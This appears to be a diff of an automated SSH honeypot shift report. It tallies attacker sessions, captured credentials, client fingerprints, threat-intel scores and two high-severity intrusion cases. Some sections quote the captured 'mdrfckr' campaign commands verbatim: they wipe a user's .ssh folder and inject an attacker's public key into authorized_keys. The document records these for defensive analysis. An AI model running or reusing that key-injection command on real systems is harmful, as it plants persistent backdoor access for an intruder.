@@ -3,8 +3,8 @@
 | Field | Value |
 |---|---|
 | **Report Date** | 2026-04-26 |
-| **Generated At** | 2026-04-26T16:50:42Z |
-| **Shift Time** | 16:50 UTC |
+| **Generated At** | 2026-04-26T19:01:45Z |
+| **Shift Time** | 19:01 UTC |
 | **Honeypot Status** | ✅ HEALTHY |
 | **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |
 
@@ -14,14 +14,14 @@
 
 | Metric | Value |
 |---|---|
-| Total Sessions Captured | **109** |
-| Confirmed Threats | **11** |
-| False Positives Filtered | **98** (89.9%) |
-| Unique Attacker IPs | **16** |
-| Countries of Origin | **11** |
-| High Severity Cases | **1** |
+| Total Sessions Captured | **121** |
+| Confirmed Threats | **25** |
+| False Positives Filtered | **96** (79.3%) |
+| Unique Attacker IPs | **34** |
+| Countries of Origin | **14** |
+| High Severity Cases | **2** |
 | Medium Severity Cases | **0** |
-| Low Severity Cases | **108** |
+| Low Severity Cases | **119** |
 | Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |
 
 ---
@@ -31,42 +31,45 @@
 | Metric | Value |
 |---|---|
 | Total Auth Attempts | **5** |
-| Unique Credential Pairs | **4** |
+| Unique Credential Pairs | **5** |
 | Unique Usernames | **3** |
-| Unique Passwords | **4** |
-| Successful Auth Pairs | **1** |
+| Unique Passwords | **5** |
+| Successful Auth Pairs | **2** |
 
 **Top Usernames:**
 
 | Username | Attempts |
 |---|---|
-| `pi` | 2 |
 | `admin` | 2 |
-| `root` | 1 |
+| `root` | 2 |
+| `345gs5662d34` | 1 |
 
 **Top Passwords:**
 
 | Password | Attempts |
 |---|---|
-| `` | 2 |
-| `raspberryraspberry993311` | 1 |
-| `raspberry` | 1 |
-| `------fuck------` | 1 |
+| `admin` | 1 |
+| `` | 1 |
+| `qaz1234567` | 1 |
+| `345gs5662d34` | 1 |
+| `3245gs5662d34` | 1 |
 
 **Top Credential Pairs:**
 
 | Username | Password | Attempts |
 |---|---|---|
-| `admin` | `` | 2 |
-| `pi` | `raspberryraspberry993311` | 1 |
-| `pi` | `raspberry` | 1 |
-| `root` | `------fuck------` | 1 |
+| `admin` | `admin` | 1 |
+| `admin` | `` | 1 |
+| `root` | `qaz1234567` | 1 |
+| `345gs5662d34` | `345gs5662d34` | 1 |
+| `root` | `3245gs5662d34` | 1 |
 
 **⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**
 
 | Username | Password | Source IP | Timestamp |
 |---|---|---|---|
-| `root` | `------fuck------` | `180.76.171.14` | 2026-04-26T16:37:27 |
+| `root` | `qaz1234567` | `165.154.36.71` | 2026-04-26T18:51:50 |
+| `root` | `3245gs5662d34` | `165.154.36.71` | 2026-04-26T18:51:56 |
 
 ---
 
@@ -74,7 +77,7 @@
 
 | Metric | Value |
 |---|---|
-| Total Sessions Parsed | **109** |
+| Total Sessions Parsed | **121** |
 | Sessions with Fingerprint | **4** |
 | Unique HASSH Fingerprints | **4** |
 
@@ -82,26 +85,55 @@
 
 | Client Family | Sessions |
 |---|---|
+| libssh | 5 |
 | Unknown | 2 |
-| OpenSSH | 2 |
-| Go SSH scanner | 2 |
+| Go SSH scanner | 1 |
 
 **⚠️ Botnet/Scanner KEX Signatures Detected:**
 
 | HASSH | Signature | Sessions | IPs |
 |---|---|---|---|
-| `ec7378c1a92f...` | Generic scanner | 2 | 1 |
+| `af8223ac9914...` | libssh-based | 3 | 1 |
+| `03a80b21afa8...` | Modern SSH client | 2 | 2 |
 | `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |
-| `98f63c4d9c87...` | Generic scanner | 1 | 1 |
 
 **Top Fingerprints:**
 
 | HASSH | Client | Sessions | IPs | Botnet Sig |
 |---|---|---|---|---|
-| `95420f9d932d...` | Unknown | 2 | 2 | — |
-| `ec7378c1a92f...` | OpenSSH | 2 | 1 | Generic scanner |
+| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
+| `95420f9d932d...` | Unknown | 2 | 1 | — |
+| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |
 | `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
-| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
+
+---
+
+## ⚔️ Attack Campaign Intelligence
+
+| Metric | Value |
+|---|---|
+| Total Command Clusters | **1** |
+| Campaign Clusters | **1** |
+| Highest Severity | **HIGH** |
+
+**Active Campaigns:**
+
+| Campaign | Severity | Sessions | IPs | TTPs |
+|---|---|---|---|---|
+| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |
+
+**🔴 HIGH · mdrfckr SSH Key Injection**
+
+> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.
+
+Representative commands:
+```
+cd ~; chattr -ia .ssh; lockr -ia .ssh
+```
+```
+cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+```
+Source IPs: `165.154.36.71`
 
 ---
 
@@ -109,63 +141,98 @@
 
 | Metric | Value |
 |---|---|
-| Total IPs Analysed | **16** |
-| Unique ASNs | **13** |
-| High-Risk ASNs | **5** |
+| Total IPs Analysed | **34** |
+| Unique ASNs | **27** |
+| High-Risk ASNs | **9** |
 | Anon Infrastructure ASNs | **0** |
 
 **Top Attack ASNs:**
 
 | ASN | Provider | IPs | Risk |
 |---|---|---|---|
-| `AS51396` | Pfcloud UG | 4 | HIGH |
-| `AS25019` | Saudi Telecom Company JSC | 1 | LOW |
-| `AS20011` | Dimension Data | 1 | LOW |
-| `AS5384` | Emirates Internet | 1 | HIGH |
-| `AS14593` | Space Exploration Technologies Corporation | 1 | LOW |
+| `AS55836` | Reliance Jio Infocomm Limited | 4 | LOW |
+| `AS149179` | Net Express | 4 | LOW |
+| `AS8075` | Microsoft Corporation | 2 | HIGH |
 | `AS63949` | Akamai Connected Cloud | 1 | LOW |
-| `AS24086` | Viettel Corporation | 1 | HIGH |
-| `AS6057` | Administracion Nacional de Telecomunicaciones | 1 | LOW |
+| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
+| `AS14813` | Columbus Telecommunications (Barbados) Limited | 1 | LOW |
+| `AS267929` | GENIONET TELECOMUNICACIONES S.A.S | 1 | LOW |
+| `AS265688` | SINERGY SOLUCIONES INTEGRALES | 1 | LOW |
 
 ---
 
 ---
 
-## 🚨 Priority Cases — Immediate Attention (1)
+## 🚨 Priority Cases — Immediate Attention (2)
 
 > Cases with auth success, command execution, or file downloads.
 > Each requires individual review. Never grouped.
 
-### 🔴 HIGH · IR-b01134c20274
+### 🔴 HIGH · IR-765a666b9524
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `180.76.171[.]14` |
-| **First Seen** | 2026-04-26 16:37 |
-| **Last Seen** | 2026-04-26 16:37 |
-| **Session Duration** | 4s |
+| **Source IP** | `165.154.36[.]71` |
+| **First Seen** | 2026-04-26 18:51 |
+| **Last Seen** | 2026-04-26 18:51 |
+| **Session Duration** | 7s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `uname -s -m` |
+| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
+| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
+| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
+| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-04-26 18:51:49` | `cowrie.session.connect` |
+| `2026-04-26 18:51:49` | `cowrie.client.version` |
+| `2026-04-26 18:51:49` | `cowrie.client.kex` |
+| `2026-04-26 18:51:50` | `cowrie.login.success` |
+| `2026-04-26 18:51:50` | `cowrie.session.params` |
+| `2026-04-26 18:51:50` | `cowrie.command.input` |
+| `2026-04-26 18:51:50` | `cowrie.command.failed` |
+| `2026-04-26 18:51:51` | `cowrie.log.closed` |
+| `2026-04-26 18:51:51` | `cowrie.session.params` |
+| `2026-04-26 18:51:51` | `cowrie.command.input` |
+| `2026-04-26 18:51:52` | `cowrie.session.file_download` |
+| `2026-04-26 18:51:52` | `cowrie.log.closed` |
+| `2026-04-26 18:51:56` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `165.154.36[.]71` to AbuseIPDB if not already reported
+- [ ] Block `165.154.36[.]71` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Submit download hash(es) to VirusTotal
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-0f65571170f9
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `165.154.36[.]71` |
+| **First Seen** | 2026-04-26 18:51 |
+| **Last Seen** | 2026-04-26 18:51 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
 | **TTPs (MITRE)** | T1078 · T1592 |
 
 **Attack Timeline:**
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-04-26 16:37:25` | `cowrie.session.connect` |
-| `2026-04-26 16:37:25` | `cowrie.client.version` |
-| `2026-04-26 16:37:26` | `cowrie.client.kex` |
-| `2026-04-26 16:37:27` | `cowrie.login.success` |
-| `2026-04-26 16:37:28` | `cowrie.session.params` |
-| `2026-04-26 16:37:28` | `cowrie.command.input` |
-| `2026-04-26 16:37:30` | `cowrie.log.closed` |
-| `2026-04-26 16:37:30` | `cowrie.session.closed` |
+| `2026-04-26 18:51:55` | `cowrie.session.connect` |
+| `2026-04-26 18:51:55` | `cowrie.client.version` |
+| `2026-04-26 18:51:55` | `cowrie.client.kex` |
+| `2026-04-26 18:51:56` | `cowrie.login.success` |
+| `2026-04-26 18:51:56` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `180.76.171[.]14` to AbuseIPDB if not already reported
-- [ ] Block `180.76.171[.]14` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
+- [ ] Submit `165.154.36[.]71` to AbuseIPDB if not already reported
+- [ ] Block `165.154.36[.]71` at perimeter firewall / security group
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
 ---
@@ -177,14 +244,17 @@
 
 | IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
 |---|---|---|---|---|---|---|---|
-| `116.105.173[.]160` | **2** | 2026-04-26 15:54 | 2026-04-26 15:55 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
-| `204.76.203[.]224` | **2** | 2026-04-26 15:44 | 2026-04-26 15:44 | 0m | 0 | `T1592` | 🟢 LOW |
-| `139.19.117[.]130` | 1 | 2026-04-26 16:11 | 2026-04-26 16:11 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
-| `176.65.149[.]209` | 1 | 2026-04-26 16:23 | 2026-04-26 16:23 | 30s | 0 | `T1592` | 🟢 LOW |
-| `180.76.171[.]14` | 1 | 2026-04-26 16:37 | 2026-04-26 16:37 | 0s | 0 | `T1592` | 🟢 LOW |
-| `204.76.203[.]225` | 1 | 2026-04-26 15:44 | 2026-04-26 15:44 | 0s | 0 | `T1592` | 🟢 LOW |
-| `204.76.203[.]226` | 1 | 2026-04-26 15:44 | 2026-04-26 15:44 | 0s | 0 | `T1592` | 🟢 LOW |
-| `92.97.227[.]74` | 1 | 2026-04-26 14:50 | 2026-04-26 14:50 | 12s | 0 | `T1592` | 🟢 LOW |
+| `193.227.237[.]53` | **12** | 2026-04-26 18:33 | 2026-04-26 18:47 | 24m | 0 | `T1592` | 🟠 MEDIUM |
+| `117.50.138[.]166` | **2** | 2026-04-26 18:26 | 2026-04-26 18:28 | 2m | 0 | `T1592` | 🟢 LOW |
+| `106.12.69[.]68` | 1 | 2026-04-26 18:57 | 2026-04-26 18:59 | 120s | 0 | `T1592` | 🟢 LOW |
+| `139.19.117[.]130` | 1 | 2026-04-26 18:10 | 2026-04-26 18:10 | 10s | 1 | `T1110.001 · T1592` | 🟢 LOW |
+| `14.103.117[.]75` | 1 | 2026-04-26 18:54 | 2026-04-26 18:56 | 120s | 0 | `T1592` | 🟢 LOW |
+| `142.93.188[.]104` | 1 | 2026-04-26 17:45 | 2026-04-26 17:45 | 0s | 0 | `T1592` | 🟢 LOW |
+| `165.154.36[.]71` | 1 | 2026-04-26 18:51 | 2026-04-26 18:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
+| `172.185.40[.]47` | 1 | 2026-04-26 16:58 | 2026-04-26 16:59 | 64s | 1 | `T1110.001` | 🟢 LOW |
+| `190.97.239[.]26` | 1 | 2026-04-26 18:48 | 2026-04-26 18:50 | 120s | 0 | `T1592` | 🟢 LOW |
+| `47.121.181[.]175` | 1 | 2026-04-26 18:21 | 2026-04-26 18:21 | 0s | 0 | `T1592` | 🟢 LOW |
+| `72.49.194[.]134` | 1 | 2026-04-26 16:52 | 2026-04-26 16:52 | 13s | 0 | `T1592` | 🟢 LOW |
 
 ---
 
@@ -222,16 +292,16 @@
 
 | IP | Country | ISP | Abuse Score | OTX Pulses |
 |---|---|---|---|---|
-| `92.97.227[.]74` | AE | Emirates Telecommunications Corporation | **100** ⚠️ | 10 |
-| `176.65.149[.]209` | NL | Pfcloud UG | **100** ⚠️ | 37 |
-| `204.76.203[.]226` | NL | Intelligence Hosting LLC | **100** ⚠️ | 6 |
-| `204.76.203[.]224` | NL | Intelligence Hosting LLC | **100** ⚠️ | 9 |
-| `204.76.203[.]225` | NL | Intelligence Hosting LLC | **100** ⚠️ | 11 |
-| `116.105.173[.]160` | VN | Viettel Group | **100** ⚠️ | 15 |
+| `47.121.181[.]175` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 1 |
+| `72.49.194[.]134` | US | CINCINNATI BELL | **100** ⚠️ | 8 |
+| `172.185.40[.]47` | US | Microsoft Limited | **100** ⚠️ | 9 |
+| `14.103.117[.]75` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
 | `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
-| `180.76.171[.]14` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 31 |
-| `190.134.67[.]35` | UY | Administracion Nacional de Telecomunicaciones | **45** | 0 |
-| `125.43.8[.]62` | CN | China Unicom Henan province network | **31** | 0 |
+| `106.12.69[.]68` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
+| `142.93.188[.]104` | US | DigitalOcean, LLC | **100** ⚠️ | 7 |
+| `165.154.36[.]71` | US | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
+| `117.50.138[.]166` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 5 |
+| `190.97.239[.]26` | VE | VIGINET C.A | **89** ⚠️ | 1 |
 
 ---
 
@@ -239,23 +309,31 @@
 
 | TTP ID | Count |
 |---|---|
-| [T1592](https://attack.mitre.org/techniques/T1592) | 6 |
+| [T1592](https://attack.mitre.org/techniques/T1592) | 8 |
 | [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 3 |
-| [T1078](https://attack.mitre.org/techniques/T1078) | 1 |
+| [T1078](https://attack.mitre.org/techniques/T1078) | 2 |
+| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
+| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |
 
 ---
 
-## 🔕 False Positive Summary (98 filtered)
+## 🔕 False Positive Summary (96 filtered)
 
 | Reason | Count |
 |---|---|
-| AbuseIPDB score 0 below threshold 25 | 61 |
-| AbuseIPDB score 13 below threshold 25 | 2 |
-| AbuseIPDB score 16 below threshold 25 | 1 |
-| AbuseIPDB score 20 below threshold 25 | 6 |
-| AbuseIPDB score 23 below threshold 25 | 1 |
-| AbuseIPDB score 4 below threshold 25 | 1 |
-| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 26 |
+| AbuseIPDB score 0 below threshold 25 | 15 |
+| AbuseIPDB score 12 below threshold 25 | 1 |
+| AbuseIPDB score 13 below threshold 25 | 8 |
+| AbuseIPDB score 14 below threshold 25 | 1 |
+| AbuseIPDB score 15 below threshold 25 | 2 |
+| AbuseIPDB score 16 below threshold 25 | 3 |
+| AbuseIPDB score 18 below threshold 25 | 1 |
+| AbuseIPDB score 19 below threshold 25 | 1 |
+| AbuseIPDB score 20 below threshold 25 | 4 |
+| AbuseIPDB score 24 below threshold 25 | 7 |
+| AbuseIPDB score 4 below threshold 25 | 17 |
+| AbuseIPDB score 5 below threshold 25 | 20 |
+| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |
 
 > FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.
 
@@ -266,19 +344,19 @@
 | Tool | Role | Status |
 |---|---|---|
 | Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
-| Tool 26  | Incident Timeline Generator | ✅ 109 cases |
+| Tool 26  | Incident Timeline Generator | ✅ 121 cases |
 | Tool 34  | Credential Extractor        | ✅ 5 attempts |
 | Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
 | Tool 36  | Command Clustering          | ✅ 1 clusters |
-| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
-| Tool 29  | False Positive Tracker      | ✅ 98 filtered (89.9%) |
+| Tool 27  | Threat Intel Feeder         | ✅ 34 IPs enriched |
+| Tool 29  | False Positive Tracker      | ✅ 96 filtered (79.3%) |
 | Tool 30  | Metric Exporter             | ✅ stats.json written |
-| Tool 30b | ASN Clustering              | ✅ 13 ASNs |
+| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
 | Tool 31  | Malware Analyzer            | ✅ 23 files |
 | Tool 33  | YARA Classifier             | ✅ 8 classified |
 | Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |
 
-> **Report grouping:** 1 priority case(s) shown individually · 8 recon entry/entries in table (2 group(s) consolidating 4 session(s)).
+> **Report grouping:** 2 priority case(s) shown individually · 11 recon entry/entries in table (2 group(s) consolidating 14 session(s)).
 
 ---
 
@@ -294,4 +372,4 @@
 
 _Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
 _Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
-_Report time: 2026-04-26T16:50:42Z_
+_Report time: 2026-04-26T19:01:45Z_
